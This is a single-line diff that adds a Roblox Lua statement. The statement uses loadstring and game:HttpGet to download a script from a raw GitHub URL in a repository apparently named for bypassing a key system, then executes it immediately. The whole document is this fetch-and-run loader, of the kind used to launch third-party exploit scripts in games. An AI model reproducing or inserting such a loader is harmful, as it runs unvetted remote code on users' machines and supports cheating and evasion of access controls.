@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WereHappyTogether/done-with-keys/main/donewithkey"))()
